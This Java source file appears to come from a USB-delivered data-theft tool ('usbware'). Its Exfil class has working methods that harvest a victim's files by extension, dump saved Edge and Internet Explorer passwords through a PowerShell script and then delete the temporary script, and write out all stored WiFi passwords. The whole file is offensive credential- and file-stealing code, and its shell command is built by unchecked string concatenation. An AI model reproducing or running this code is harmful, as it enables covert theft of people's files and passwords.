package com.github.thatcherdev.usbware.backend;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import org.apache.commons.io.FileUtils;

public class Exfil {

	/**
	 * Copies all files with extensions that match {@link exts} in {@link root} to
	 * 'gathered\ExfiltartedFiles'.
	 * 
	 * @param root directory to search though
	 * @param exts list of extensions
	 * @return state of completion
	 */
	public static boolean exfilFiles(String root, ArrayList<String> exts) {
		try{
			new File("gathered\\ExfiltratedFiles").mkdir();
			for(String ext:exts)
				for(String file:new ArrayList<String>(Arrays.asList(Utils.runCommand("c: && cd "+root+" && dir/b/s/a:-d *."+ext).split("\n"))))
					if(!file.equals("File Not Found"))
						FileUtils.copyFile(new File(file), new File("gathered\\ExfiltratedFiles\\"+file.substring(file.lastIndexOf("\\")+1)));
			return true;
		}catch(Exception e){
			return false;
		}
	}

	/**
	 * Exfitrates plain text Microsoft Edge and Internet Explorer browser
	 * credentials to 'gathered\BrowserPasswords.txt' using a PowerShell script.
	 * 
	 * @return state of completion
	 */
	public static boolean exfilBroserCreds() {
		try{
			String content=new String(Files.readAllBytes(Paths.get("scripts\\BrowserCreds.ps1")));
			content=content.replace("output.file", System.getProperty("user.dir")+"\\gathered\\BrowserPasswords.txt");
			Files.write(Paths.get("scripts\\temp.ps1"), content.getBytes());
			Utils.runPSScript("temp.ps1");
			new File("scripts\\temp.ps1").delete();
			return true;
		}catch(Exception e){
			return false;
		}
	}

	/**
	 * Exfiltartes all stored WiFi passwords to 'gathered\WiFiPasswords.txt'.
	 * 
	 * @return state of completion
	 */
	public static boolean exfilWiFi() {
		PrintWriter out=null;
		try{
			out=new PrintWriter(new FileOutputStream(new File("gathered\\WiFiPasswords.txt")), true);
			out.print(Utils.allWiFiPass());
			return true;
		}catch(Exception e){
			return false;
		}finally{
			if(out!=null)
				out.close();
		}
	}
}